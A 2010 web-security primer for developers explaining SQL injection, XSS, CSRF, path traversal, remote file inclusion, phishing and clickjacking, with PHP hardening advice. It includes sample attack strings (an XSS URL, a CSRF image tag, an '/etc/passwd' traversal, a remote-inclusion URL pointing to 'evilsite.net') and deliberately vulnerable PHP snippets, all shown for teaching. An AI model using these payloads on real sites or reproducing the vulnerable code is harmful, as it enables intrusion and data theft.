---
title: 'Web Security: Are You Part Of The Problem?'
slug: web-security-primer-are-you-part-of-the-problem
image: https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3df7f8a0-8641-492b-ac58-074d630b93b2/securityinfo.gif
date: 2010-01-14T17:07:06.000Z
author: christian-heilmann
summary: >-
  **Disclaimer**: The things we’ll talk about in this article today won’t make you a security expert, just as buying a Swiss Army knife won’t make you a locksmith or buying a whip won’t make you a lion tamer. The purpose here is to raise awareness and perhaps make some of that security mumbo-jumbo a bit more understandable to you.
description: >-
  The purpose of this article is to raise awareness and perhaps make some of that website security mumbo-jumbo a bit more understandable to you.
categories:
  - PHP
  - Coding
  - JavaScript
  - Security
---

Website security is an interesting topic and should be high on the radar of anyone who has a Web presence under their control. Ineffective Web security leads to all of the things that make us hate the Web: spam, viruses, identity theft, to name a few.

The problem with Web security is that, as important as it is, it is also very complex. I am quite sure that some of you reading this are already part of an network of attack computers and that your servers are sending out spam messages without you even knowing it. Your emails and passwords have been harvested and resold to people who think you need either a new watch, a male enhancement product or a cheap mortgage. Fact is, you are part of the problem and don’t know what you did to cause it.

The reason is that security experts don’t like to talk too much in public about what they do and where the issues lie; and sadly enough, they can also come across as arrogant in their views. This could be the result of people not taking security seriously and not following the most basic advice, such as using passwords that are clever, not "password" or "letmein."

Another reason is those tutorials that show you how to "do something in five minutes" and conveniently neglect to mention the security implications of their advice. If it sounds too easy to be true, it probably is. A perfect example of this is PHP solutions that use a file for data storage and ask you to make it writable to the world. This is easy to implement, but it means that any spammer can write to this file.

{{% feature-panel %}}

## An Interesting Report On Web Security

Web security company Cenzic released a report detailing trends and numbers related to Web security for the first and second quarters of 2009, and the numbers are telling:

<figure>
  <img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/d4ef5c5c-fef5-498f-804e-33c22a059c6c/4239939571-b7d3cddc83-o.gif" alt="Web Vulnerabilities Q1/Q2 2009." />
  <figcaption>PDF: Web Vulnerabilities Q1/Q2 2009.
  </figcaption>
</figure>

Among the most serious vulnerabilities were path traversal, cross-site scripting, cross-site request forgery and SQL injection. Unmentioned are a newer threat, clickjacking, and a user interface issue called phishing. You may have to deal with all of these as a Web developer if you touch PHP and HTML, CSS and JavaScript. Even if you don’t use PHP, you could still cause a lot of problems. Even if you don’t touch code and simply design, you could be a great asset in this area. You could help make the Web safer by making security issues understandable to your users.

Let’s go through all of these things and explain what they are and do. The first thing you need to know, though, is how URIs work.

## URIs: The Main Way To Attack A Web Service

The address of any document (i.e. file on the Internet) is its [Uniform Resource Identifier](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) (URI). This is what you enter in the browser bar to access the document and what you embed into code to point to the document. For example, my website address is <code>https://icant.co.uk</code>, and the document you see when you open it in a browser is <code>https://icant.co.uk/index.php</code> (the server automatically redirects to that document). The logo image resides at the URI <code>https://icant.co.uk/iconslogo.png</code>, and the image of me pointing at you is on a totally different server and has the URI <code>https://farm4.static.flickr.com/3172/3041842192_5b51468648.jpg</code>.

All of these URIs are okay for you to access. Some URIs, though, contain information that should not be accessible to the outside world. For example, the <code>/etc/password</code> folder on a server contains password and user information that should not leak to the Internet.

Every URI can also contain parameters. These are instructions you can send to the script located at that URI and that are appended to the URI starting with a <code>?</code> and separated by ampersands. If you want to search for puppies on Google, for example, you can use the URI <code>https://www.google.com/search?q=puppies</code>, and if you want to begin your search after the first 50 results, you can use <code>https://www.google.com/search?q=puppies&amp;start=50</code>.

Normally, these parameters are not entered by end users but rather come from the HTML interface. If you look at the source code of the Google home page and get rid of the painful bits, you end up with the following form:

<pre><code>&lt;form name="f" action="/search"&gt;
  &lt;input type="hidden" value="en" name="hl"/&gt;
  &lt;input type="hidden" value="hp" name="source"/&gt;
  &lt;input name="q"/&gt;
  &lt;input type="submit" name="btnG"/&gt;
  &lt;input type="submit" name="btnI"/&gt;
  &lt;input type="hidden" name="aq"/&gt;
  &lt;input type="hidden" name="oq"/&gt;
  &lt;input type="hidden" name="aqi"/&gt;
&lt;/form&gt;</code></pre>

So in essence, this form sends the content of all of these fields to the URI <code>search</code> and appends them to that URI. This is how you end up with this,

<pre><code>https://www.google.com/search?hl=en&amp;source=hp&amp;q=puppies&amp;aq=f&amp;oq=&amp;aqi=</code></pre>

when you submit the form. Notice, for instance, that I have no <code>btnG</code> parameter because I used the _Enter_ key to submit the form.

On the search results page, you can see the pagination links at the bottom (the _1 2 3_ and so on under the _Gooooooogle_ logo), and you can see that these links send the same data to the URI and add a <code>start</code> parameter:

<pre><code>&lt;a href="/search?hl=en&amp;amp;q=puppies&amp;amp;<strong>start=40</strong>&amp;amp;sa=N"&gt;5&lt;/a&gt;</code></pre>

You can send parameters to a script with the URI via form fields, links or any other thing in HTML that contains a URI: images, link elements, frames, anything that can take an <code>href</code> or <code>src</code> attribute. If an attacker can override any of these or add a new image to your HTML without you knowing it, they could point to their own URIs and send their own parameters.

You have to be careful with what your parameters contain and where they point to, which could be someone else’s server (to get more code) or sections of your own server that you don’t want to show or send to another server.

## Different Types Of Attacks. What Do These Words Mean?

Let’s quickly go through the different items mentioned in the graph above, explaining what they are and what they mean.

### SQL Injection

With an SQL injection, an attacker accesses your database by sending an SQL command to your server via the URI or form fields. This is easily worked around by [sanitizing](https://en.wikipedia.org/wiki/SQL_injection), but neglecting to do so can be fatal for your website, as the following [XKCD comic](https://xkcd.com/327/) shows:

<figure><a href="https://xkcd.com/327/"><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/19c7e56f-681a-44e6-9870-0b447cf1a4c2/exploits-of-a-mom.png" alt="comic showing how SQL injection would delete a database" /></a><figcaption><a href="https://xkcd.com/327/">XKCD comic</a> showing how SQL injection would delete a database.</figcaption></figure>

### Cross-Site Scripting (XSS)

Cross-site scripting is probably the biggest and most common problem. With it, an attacker injects JavaScript code into your document by adding it to the end of the URI as a parameter or in a form field.

Say you want to be cool and allow visitors to customize certain colors on your page. You could do this easily in PHP:

<pre><code>&lt;?php
  // predefine colors to use
  $color = ’white’;
  $background = ’black’;
  // if there is a parameter called color, use that one
  if(isset($_GET[’color’])){
    $color = $_GET[’color’];
  }
  // if there is a parameter called background, use that one
  if(isset($_GET[’background’])){
    $background = $_GET[’background’];
  }
?&gt;

&lt;style type="text/css" media="screen"&gt;
  #intro{
    /* color is set by PHP */
    color:&lt;?php echo $color;?&gt;;
    /* background is set by PHP */
    background:&lt;?php echo $background;?&gt;;
    font-family:helvetica,arial,sans-serif;
    font-size:200%;
    padding:10px;
  }
&lt;/style&gt;

&lt;p id="intro"&gt;Cool intro block, customizable, too!&lt;/p&gt;</code></pre>

So far, everything’s kosher, and we’re not even using inline styles! If you save this now as _test.php_ and call it on your server in your browser as the URI <code>https://example.com/test.php</code>, you will get a text intro block that is black on white. The <code>$\_GET[]</code> variables come from the URI as parameters, and because they are not set, nothing changes. If you want the colors to be red on pink, you can do this: <code>https://example.com/test.php?color=red&amp;background=pink</code>.

But because you allow any value for the variables, an attacker could send the following:

<pre><code>https://example.com/test.php?color=green&amp;background=&lt;/style&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code></pre>

This would effectively close the style block prematurely and add a script to the document. In this case, all we would be doing is writing out the word XSS, but we could do anything that a JavaScript is allowed to do. You can see the results in the following screenshot:

<figure><a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/858271bd-89ff-4b8f-a6a4-ad03da9cc710/4242086213-c3a9fae808-o.jpg"><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/cd6ed322-638e-475c-8458-d13f87687371/xss.jpg" alt="XSS example." width="550" height="368" /></a><figcaption><a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/858271bd-89ff-4b8f-a6a4-ad03da9cc710/4242086213-c3a9fae808-o.jpg">Large view</a></figcaption></figure>

Once you have successfully injected JavaScript, you will be able to read out cookies; open forms that ask the user to enter their passwords or credit card details; execute viruses, worms and "drive-by downloads"; the lot. The reason is that JavaScript is not bound by any security model; any script on the page has the same rights, no matter which server it has come from. This is a big security problem with JavaScript and is something clever people are working on.

XSS is a very common problem. Websites such as [XSSED.org](http://xssed.org/) have a field day showing the world just how many websites are vulnerable:

<figure><a href="http://xssed.org/"><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/02db3be5-ced8-4a92-a88e-cfb1e5c60b6b/xssed.jpg" alt="XSSed.org lists cross-site-scripting vulnaribilities." width="550" height="389" /></a></figure>

The remedy for XSS is to be very paranoid about anything that comes via forms or the URI. You also need to be sure that your PHP is set up properly (we’ll come back to some ways to test for that and to write good code later on).

{{% ad-panel-leaderboard %}}

### Path Traversal

Allowing for path or directory traversal on your server is an amazingly bad idea. You would be allowing people to list the folders on your server and to navigate from folder to folder. This allows attackers to go to folders with sensitive information or website functionality and have some fun. The following screenshot is of me accessing the database of a sandwich company, sending emails from their server and reading the order logs:

<figure><a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/4b7dde85-d3ea-4038-a40b-eb0c25cd6d0c/menu-management.gif"><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/9cfc9b89-f65c-4aee-80ff-68eae87d0a44/path.jpg" alt="An unprotected cgi_bin will hurt you." /></a><figcaption><a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/4b7dde85-d3ea-4038-a40b-eb0c25cd6d0c/menu-management.gif">Large view</a></figcaption></figure>

I was able to get all of this information simply by accessing the _cgi-bin_ folder, which was unprotected from being listed. So, instead of going to <code>https://example.com</code>, I went to <code>https://example.com/cgi-bin/</code> in my browser. I knew something was wrong on their big Flash website when I clicked on the menu. It popped up in a new window and had a URI like

<pre><code>https://www.example.com/cgi/food_db/db.cgi?db=default&amp;uid=default&amp;Category=Sandwiches&amp;Subcategory=Sandwiches&amp;Product=Chicken%20and%20Bacon&amp;Soup_size=&amp;Drinks_milk_type=&amp;ww=on&amp;view_records=yes</code></pre>

which gave me all the information I needed to play around.

The other problem of allowing folders to be listed is that search engines will index your information, allowing anyone to use Google as a hacking tool. As servers create a page with a title and a headline of the folder name, these are indexed by Google.

You could <a href="https://www.google.com/search?hl=en&amp;q=%22index+of+%2Febooks%22">search for, say, "index of /ebooks"</a> to find electronic books online or <a href="https://www.google.com/search?hl=en&amp;q=%22index+of+%2Fphotos%22">"index of /photos"</a> to find photos.

This method of searching worked much better in the past, by the way: not because people protect their servers better now, but because spammers who offer fake pirated products realize that people do these searches and fake it now to optimize their own websites’ search engine rankings.

### Cross-Site Request Forgery

[Cross-site request forgery](https://en.wikipedia.org/wiki/Csrf) (CSRF) exploits browsers and websites that allow for functionality to be called without really knowing that an actual user initiated it. Say you have a form on your website <code>https://example.com</code> that works with GET and sends things to your database:

<pre><code>&lt;form method="get" action="add_to_db.php"&gt;
  &lt;div&gt;
    &lt;label for="name"&gt;Name&lt;/label&gt;
    &lt;input type="text" id="name" name="name"&gt;
  &lt;/div&gt;
  &lt;div&gt;
    &lt;label for="email"&gt;email&lt;/label&gt;
    &lt;input type="text" id="email" name="email"&gt;
  &lt;/div&gt;
  &lt;div&gt;
    &lt;label for="comment"&gt;Comment&lt;/label&gt;
    &lt;textarea id="comment" name="comment"&gt;&lt;/textarea&gt;
  &lt;/div&gt;
  &lt;div&gt;&lt;input type="submit" value="tell me more"&gt;&lt;/div&gt;
&lt;/form&gt;</code></pre>

Forms can be sent by two methods: GET adds all of the parameters to the URI visibly in the address bar, whereas POST sends them "under the hood." POST also allows you to send much more data. This is a simplification but all you need to know for now.

If the script that adds to the database doesn’t check that the form was really sent from your server, I could add an image to any website by doing this:

<pre><code">&lt;img src="https://example.com/add_to_db.php?
name=cheap%20rolex&amp;email=susan@hotchicks.com&amp;comment=mortgage%20help" width="1" height="1"&gt;</code></pre>

Anybody coming to my website would now be putting another comment into your database. I could use an image or CSS link or script or anything that allows for a URI to be defined and loaded by a browser when the HTML renders. In CSS, this could be a background image.

CSRF becomes even more dangerous when you are logged into and authenticated by a particular system. An image in any other tab in your browser could execute a money transfer, read your emails and send them on and many other evil things.

A really interesting case of CSRF (albeit an innocent one) occurred in 2006, when Google released its now discontinued Web accelerator tool (GWA). The idea was to pre-fetch websites that were linked to from the current document, thus making surfing faster. All well and good... until you ended up with delete links in websites that worked like this:

<pre><code>&lt;a href="/app/delete_entry.php?id=12"&gt;delete&lt;/a&gt;</code></pre>

Because some applications did not check if this was an initiated deletion or an attempt of GWA to pre-load the page, the tool deleted whole blogs and product databases. Google did nothing wrong, but the community learned a lot about CSRF that day.

Now, you might suppose that moving your forms from GET to POST would make them safe, right? Partially, yes, but an attacker could still use a form and trick people into clicking a button to make the request:

<pre><code>&lt;form method="post" action="add_to_db.php"&gt;
  &lt;div&gt;
    &lt;input type="hidden" name="name" value="bob"&gt;
    &lt;input type="hidden" name="email" value="bob@experts.com"&gt;
    &lt;input type="hidden" name="comment" 
           value="awesome article, buy cialis now!"&gt;
  &lt;input type="submit" value="see beautiful kittens now!"&gt;
  &lt;/div&gt;
&lt;/form&gt;</code></pre>

You could even use JavaScript to automatically send the form or a script on another server to do the POST request from the back-end. There are many ways to exploit CSRF, and protecting against it is not that hard.

### Remote File Inclusion (RFI)

With [Remote file inclusion](https://en.wikipedia.org/wiki/Remote_File_Inclusion) or [code injection](https://en.wikipedia.org/wiki/Code_injection), an attacker uses a flaw in your website to inject code from another server to run on yours. It is in the same family as XSS but much more problematic because you have full access to your server (with JavaScript, you can steal cookies and call other code, but you can’t access the file system without resorting to tricks with Flash or Java Applets).

Any code injected to your server with an untested variable and <code>include()</code> command, for example, could run server commands: upload and download and transfer data to other servers, check your server passwords and user names, anything you can do on the command line via PHP or ASP if your server allows for it.

This is probably the worst that can happen to your server, because with command line access, I could turn it into an attack machine for a server network attack, silently listen to everything you and your users do on the server and send it to another Web resource, store information and viruses for distribution, inject spam links, you name it.

The workaround is to turn off <code>globals</code> and to never _ever_ assemble a URI from parameter or form data. (More on that later in the PHP section of the tips.)

### Phishing

[Phishing](https://en.wikipedia.org/wiki/Phishing) is the technique of fooling people into entering information into a bad website. You show end users an interface that looks legit (for a bank or what have you) but that in reality sends their information to your database. Because phishing is a felony, I cannot show you a demo.

The trick with phishing is to make the form really look like it comes from a website you trust. You have probably gotten emails saying that your "XYZ bank account" has been compromised, and you know for certain that this isn’t the case because you have no account with that bank and may not have even heard of it. This is a wild-guess phishing attempt, which is not usually effective.

On the Web, though, an attacker can perform a JavaScript trick to find out where you’ve been. As [Jeremiah Grossman showed some years ago](https://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html), you can use JavaScript to determine the state of a link on the page. Because the colors of visited and unvisited links are different, we can use this technique to figure which websites a user has been to and then display the appropriate logo above the form.[This demo shows this quite effectively](https://www.debugtheweb.com/test/cssvisited.htm).

### Clickjacking

[Clickjacking](https://en.wikipedia.org/wiki/Clickjacking) is a terribly clever way to use CSS and inline frames to trick users into clicking something without knowing it. Probably the most famous example of this was the "Don’t click me" exploit of Twitter a few months ago. All of a sudden, Twitter was full of messages pointing to a website with a button that read "Don’t click me". Here is an examples for Jason Kottke’s stream:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/58a17993-4e58-4b51-8663-5bb5b0a7c0af/dontclick.jpg" alt="The don’t click Twitterbomb in action." width="453" height="143" /><figcaption>Twitter’s “Don’t Click” prank, explained</figcaption></figure>

Human nature being what it is, many people clicked the button, which seemingly did nothing. What it actually did, though, was put your Twitter home page on top of the button as a frame, with an opacity of 0 in the CSS. The update field was pre-set with the tweet pointing to the page. The following screenshot makes this obvious, with the opacity set here to 0.5:

<figure><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/7055576e-0f57-42a0-b331-694fdd1a0afd/clickjacking1.jpg" alt="How the clickjacking twitter bomb worked." width="609" height="308" /></figure>

By clickjacking, you can make end users do things without knowing it. Every action on a website that can be performed with a simple click can be exploited with this trick.

Clickjacking is a massive problem because it is done via CSS, not a script. Unless browsers block frames from having an opacity of 0, there is no simple workaround. The main counter-measure people take is to disallow embedding in frames using JavaScript. However, with JavaScript off, clickjacking still works.

{{% ad-panel-leaderboard %}}

## Basic Ways To Increase Web Security

Now that you know a bit about what can be done to your website by the bad guys, here are some ways to fight them off.

### Keep Code Up to Date

There is no better protection than keeping your code up to date. Outdated versions of WordPress, old installs of PHP and MySQL, even old browsers, all of these are security issues because most updates to software these days are security patches. It is a rat race between those who want the Web to work and those who want to abuse it to make a quick buck or to steal your identity. So please help the good guys by upgrading whenever a new version is out.

### Don’t Stay Logged In, and Don’t Entice Others to Either

Staying logged in while not using a system is dangerous. Other websites you surf to can check that you are logged in and then clickjack you to make you do something you don’t mean to or aren’t aware of. This is especially dangerous with social media because everything you do will be sent to all your friends and probably replicated by them. It is a snowball effect.

In my perfect world, no form has a "Keep me logged in" option, which of course would be a nuisance to end users. I would love to see a clever, usable solution to this problem. I use a Flex client for Twitter, not a browser, which means I am not vulnerable even on websites with clickjacking and cross-site request forgery (the latter only if people do not abuse the API to phish my followers; see the presentations at the end of this article for a demo of that).

### Use Clever Passwords, and Entice Users to Do the Same

Even on bullet-proof systems, one attack vector is users whose passwords are very easy to guess. I change my passwords every few weeks, and I take inspiration from a book I am reading or a movie I have just seen. I also replace some characters and with numbers to make dictionary attacks harder.

There are **two ways to crack a password** (other than social engineering, which is making you tell me your password by tricking you or phishing): brute force and dictionary attacks. Brute force entails writing a loop that tries all of the different options (much like playing hangman), which can take ages and uses a lot of computing power. Dictionary attacks use a dictionary database to attempt common words instead of going letter by letter.

Say I am reading a Sherlock Holmes book or have just seen the new screen adaptation, my password could be <code>Sh3rl0ckW4t50n</code> or <code>b4sk3rv!ll3</code>. That may be a bit hardcore for most people but is generally a good idea. Another strategy is to take a sentence that you can memorize easily and string together the initial letters. For example, "I like to buy food for my dog and to walk with it" would be <code>Il2bffmda2wwi</code> or even <code>Il2bffmd&amp;2wwi</code>.

So, if you build a new Web product that needs authentication, and you really need to build your own log-in system rather than use Google, Yahoo, Facebook Connect or OpenID (which might be a good idea), please do not allow users to use passwords like "password" or the not-much-safer "password1." Recently, a [list of passwords banned by Twitter](http://www.gaj-it.com/14253/twitter-bans-370-passwords-too-easy-to-hack) leaked onto the Web. This is a good idea (the list, that is, not the leak).

## What To Do On Your Server

Even if you are not a server expert, that’s no excuse for running an insecure server. Here are some things to make sure of.

### Turn Off Folder Listing

As explained earlier, allowing people to navigate your folders (i.e. path traversal) is a bad idea. Testing whether your server has path traversal turned on is easy:

1. Create a new folder on the server; for example, _pathtest_.
2. Add some files to the folder. But do not add _index.html_, _index.php_, _default.aspx_ or whatever else your server uses as the default file name.
3. Check the folder in your browser; for example, by going to `https://example.com/pathtest/`
4. If you can see a listing, contact your server admin to turn that off!

### Harden Your PHP

If you have a server with PHP, be aware that you are in control of a powerful tool. The worst oversight someone could make is to allow any parameter that comes in from the URI to become a global variable. This is turned off by default on PHP installs in version 4.2.0 and onward, but your configuration may have changed. In fact, some tutorials recommend that you turn it on for a script to work: this is a very, very bad idea.

You can easily test if globals are enabled:

1.  Create a new file named _test.php_.
2.  Add the following code to it:

        <?php echo "*".$ouch.’*’;?>

3.  Upload the file to your server.
4.  Browse to the file, and send a parameter called ouch; for example: `https://example.com/test.php?ouch=that+hurts`
5.  If your browser shows "_that hurts_", then your server has globals registered.
6.  Contact your server admin to get this fixed!

Why is this important? Well, in our explanation of XSS earlier, we talked about attackers being able to add code to your page using the URI parameters in your script. If you don’t turn off globals, any variable you use and write out could become an attack. Even worse, consider the following code:

<pre><code>if($_POST[’username’] == ’muppet’ &amp;&amp;
   $_POST[’password’] == ’password1’) {
    $authenticated = true;
}
if($authenticated) {
  // do something only admins are allowed to do
}</code></pre>

If this is _checkuser.php_ and global registering is on, then an attacker could call this in the browser as <code>https://example.com/checkuser.php?authenticated=true</code> and could work around the whole user checking; his authentication as <code>$&#95;GET[’authenticated’]</code> automatically turns into <code>$authenticated</code>.

### Turn Off Error Messages

A lot of servers are set up to show you error messages when the browser encounters a problem. These messages often look cryptic, but they are a great source of information for attackers.

Creating an error and seeing what the server spits out is one of the first steps in checking the folder structure of a server. Funnily enough, error pages stating "File XYZ could not be found" were one of the first XSS attack opportunities, because you could look for a file named <code>&lt;script&gt;alert(document.cookie),&lt;/script&gt;</code>.

### Automatically Checking PHP for Security Issues

Uploading [PHPSecInfo](https://phpsec.org/projects/phpsecinfo/) to a folder is a pretty handy way to perform a quick audit of your PHP server’s security. Opening it in your browser gives you a detailed checklist of common security flaws and how they should be fixed.

But **never leave this on a live server**because it gives attackers a lot of details about your set-up!

<figure><a href="https://phpsec.org/projects/phpsecinfo/"><img loading="lazy" decoding="async" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3df7f8a0-8641-492b-ac58-074d630b93b2/securityinfo.gif" alt="PHPSecInfo gives you detailed security information about your PHP setup" width="550" height="499" /></a>&lt;&gt;PHPSecInfo gives you detailed security information about your PHP setup.</figure>

## What To Do To Your Code

Because you likely do not have much to do with your server let’s focus on things you do have full control of.

### HTML

HTML is pretty safe. It is simply converted into text—no interaction with the server or calculations—so not much can go wrong. That said, you should always use HTML for what it’s for:

- **HTML structures your content.**. HTML is not a database to store information. The reason it is not is because you cannot rely on HTML content to stay unchanged. Anyone could use browser debugging tools to mess around with your HTML and change the content. So you run into security issues with JavaScript solutions that rely on data in the HTML and don’t check the server for what that data is allowed to be.
- **HTML is fully visible.**. Don’t use comments in the HTML to store sensitive information, and don’t comment out sections of a page that are not ready yet but that point to parts of an application that are in progress.
- **Hiding things doesn’t make them go away.** Even if you hide information with CSS or JavaScript, some people can get it anyway. HTML is not there to give your application functionality; that should always happen on the server.

A wonderful example of insecure HTML was the drop-down menu on the website of a certain airline. This menu let you define the seating class you wanted to fly in as the last step before printing your voucher. The website rendered the HTML of the drop-down menu and commented out the sections that were not available for the price you had selected:

<pre><code>&lt;select name="class"&gt;
  &lt;option value="ec"&gt;Economy&lt;/option&gt;
  &lt;option value="ecp"&gt;Economy Plus&lt;/option&gt;
  &lt;!--
  &lt;option value="bu"&gt;Business&lt;/option&gt;
  &lt;option value="fi"&gt;First&lt;/option&gt;
  --&gt;
&lt;/select&gt;</code></pre>

The server-side code did not check to see whether you were eligible for a first-class ticket; it simply relied on the option not being available. The form was then sent via JavaScript. So, all you had to do to get a first-class ticket for the price of an economy seat was use [FireBug](https://getfirebug.com) to add a new option to the form, select the value you wanted and send it off.

### CSS

CSS is not really capable of doing much to the document and cannot access the server... for now. One problem with CSS is background images that point to URIs. You can inject code by somehow overriding these. The same applies to the <code>@import</code> property for other style sheets.

Using <code>expression()</code> in Internet Explorer to make calculations (or, as in most cases, to simulate what other browsers can already do) is dangerous, though, because what you are doing in essence is executing JavaScript inside a CSS block. So, don’t use it.

CSS changing a lot now, and we are giving it more power than ever before. Generating content with CSS, animation, calculations and font embedding all sound absolutely cool, but I get a prickly feeling in the back of my neck when I look at it right now.

Attack vectors have two features: they have the power to change the content of a document, and they are technologies that are not proven and are changing constantly. This is what CSS 3 is right now. Font-embedding in particular could become a big security issue, because fonts are binary data that could contain anything: harmless characters as well as viruses masquerading as a nice charset. It will be interesting to see how this develops.

### JavaScript

JavaScript makes the Web what it is today. You can use it to build interfaces that are fun to use and that allow visitors to reach their goals fast and conveniently. You can and should use JavaScript for the following:

- Create slicker interfaces (e.g. auto-complete, asynchronous uploading).
- Warn users about flawed entries (password strength, for instance).
- Extend the interface options of HTML to become an application language (sliders, maps, combo boxes, etc.)
- Create visual effects that cannot be done safely with CSS (animation, menus, etc.)

JavaScript is very powerful, though, which also means that it is a security issue:

- JavaScript gives you full access to the document and allows you to post data to the Internet.
- You can read cookies and send them elsewhere.
- JavaScript is also fully readable by anyone using a browser.
- Any JavaScript on the page has the same rights as the others, regardless of where it came from. If you can inject a script via XSS, it can do and access whatever the other scripts can.

This means you should not try to do any of the following in JavaScript:

- Store sensitive information (e.g. credit card numbers, any real user data).
- Store cookies containing session data.
- Try to protect content (e.g. right-click scripts, email obfuscation).
- Replace your server or save on server traffic without a fallback.
- Rely on JavaScript as the only means of validation. Attackers can turn off JavaScript and get full access to your system.
- Trust any JavaScript that does not come from your server or a similar trusted source.
- Trust anything that comes from the URI, HTML or form fields. All of these can be manipulated by attackers after the page has loaded. If you use `document.write()` on unfiltered data, you expose yourself to XSS attacks.

In other words, AJAX is fun, but do not rely on its security. Whatever you do in JavaScript can be monitored and logged by an end user with the right tools.

### PHP (or Any Server-Side Language)

**Here be dragons!** The server-side language is where you can really mess up if you don’t know what you’re doing. The biggest problems are trusting information from the URI or user entry and printing it out in the page. As shown earlier in the XSS example with the colors, you will be making it easy to inject malicious code into your page.

There are two ways to deal with this: whitelisting and proper filtering.

Whitelisting is the most effective way to make sure nothing insecure gets written out. The trick is easy: don’t use information that gets sent through as the output; rather, just use it in conditions or as lookups.

Let’s say you want to add a file on demand to a page. You currently have these sections on the page: About Us, Contact, Clients, Portfolio, Home, Partners. You could store the data of these in _about-us.php_, _contact.php_, _clients.php_, _portfolio.php_, _index.php_ and _partners.php_.

The **amazingly bad way to do this** is probably the way you see done in many tutorials: a file called something like _template.php_, which takes a <code>page</code> parameter with the file name.

The template then normally contains something like this:

<pre><code>&lt;?php include($_GET[’page’]);?&gt;</code></pre>

If you call <code>https://example.com/template.php?page=about-us.php</code>, this would load the "About Us" document and include it in the template where the code is located.

It would also allow someone to check out all of the other interesting things on your server. For example, <code>https://example.com/template.php?page=../../../../../../../../etc/passwd%00</code> or the like would allow an attacker to read your <code>passwd</code> file.

If your server allows for remote files with <code>include()</code>, you could also inject a file from another server, like <code>https://example.com/template.php?page=https://evilsite.net/exploitcode/2.txt?</code>. Remember, these text files will be executed as PHP inside your other PHP file and thus have access to everything. A lot of them contain mass-mailers or check your system for free space and upload options to store data.

In short: **never, ever allow an unfiltered URI parameter to become part of a URI that you load in PHP or print out as an <code>href</code> or <code>src</code> in the HTML**. Instead, use pointers:

<pre><code>&lt;?php
$sites = array(
  ’about’=&gt;’about-us.php’,
  ’contact’=&gt;’contact.php’,
  ’clients’=&gt;’clients.php’,
  ’portfolio’=&gt;’portfolio.php’,
  ’home’=&gt;’index.php’,
  ’partners’=&gt;’partners.php’
);
if( isset($_GET[’page’]) &amp;&amp;
    isset($sites[$_GET[’page’]]) &amp;&amp;
    file_exists($sites[$_GET[’page’]]) ){
      include($sites[$_GET[’page’]]);
} else {
  echo ’This page does not exist on this system.’;
}
?&gt;</code></pre>

This way, the parameters become not a file name but a word. So, <code>https://example.com/template.php?page=about</code> would include <code>about-us.php</code>, <code>https://example.com/template.php?page=home</code> would include <code>index.php</code> and so on. All other requests would trigger the error message. Note that the error message is in our control and not from the server; or else you might display information that could be used for an exploit.

Also, notice how defensive the script is. It checks if a <code>page</code> parameter has been sent; then it checks if an entry for this value exists in the <code>sites</code> array; then it checks if the file exist; and then, and only then, it includes it. Good code does that... which also means it can be a bit bigger than expected. That’s not exactly "Build your own PHP templating system in 20 lines of code!" But it’s much better for the Web as a whole.

Generally, defining all of the variables you will use before you use them is a good idea. This makes it safer even in PHP set-ups that have globals registered. The following cannot be cracked by calling the script with an <code>authenticated</code> parameter:

<pre><code>$authenticated = false;
if($_POST[’username’] == ’muppet’ &amp;&amp;
   $_POST[’password’] == ’password1’) {
    $authenticated = true;
}
if($authenticated) {
  // do something only admins are allowed to do
}</code></pre>

The demo we showed earlier makes it possible to work around this, because <code>$authenticated</code> was not pre-set anywhere.

Writing your own validator function is another option. For example, the color demo could be made secure by allowing only single words and numbers for the colors.

<pre><code>$color = ’white’;
$background = ’black’;
if(isset($_GET[’color’]) &amp;&amp; isvalid($_GET[’color’])){
  $color = $_GET[’color’];
  if(ishexcolor($color)){
    $color = ’#’.$color;
  }
}
if(isset($_GET[’background’]) &amp;&amp; isvalid($_GET[’background’])){
  $background = $_GET[’background’];
  if(ishexcolor($background)){
    $background = ’#’.$background;
  }
}
function isvalid($col){
  // only allow for values that contain a to z or 0 to 9
  return preg_match(’/^[a-z0-9]+$/’,$col);
}
function ishexcolor($col){
  // checks if the string is 3 or 6 characters
  if(strlen($col)==3 || strlen($col)==6){
    // checks if the string only contains a to f or 0 to 9
    return preg_match(’/^[a-f0-9]+$/’,$col);
  }
}</code></pre>

This allows for <code>https://example.com/test.php?color=red&amp;background=pink</code> or <code>https://example.com/test.php?color=369&amp;background=69c</code> or <code>https://example.com/test.php?color=fc6&amp;background=449933</code>, but not for <code>https://example.com/test.php?color=333&amp;background=&amp;lt/style&gt;</code>. This keeps it flexible for the end user but still safe to use.

If you are dealing with content that cannot be easily whitelisted, then you’ll need to filter out all the malicious code that someone could inject. This is quite the rat-race because new browser quirks are being found all the time that allow an attacker to execute code.

The most basic way to deal with this is to use the [native PHP filters on anything that comes in](https://us2.php.net/manual/en/book.filter.php). But a quite sophisticated package called [HTML Purifier](http://htmlpurifier.org/) is also available.

## Housekeeping

One very important part of security is keeping your server clean. If you have old, insecure code lying around, it won’t matter whether your main website is hardened and up to date with the best security measures. Your server is as vulnerable as its weakest and least-maintained code.

Check what you have on your server from time to time, and delete or move things that you are not interested in any more or couldn’t be bothered to maintain. Instead of deleting code, you could move it to a repository such as [Google Code](https://code.google.com) or [GitHub](https://github.com) and redirect the old folder to it.

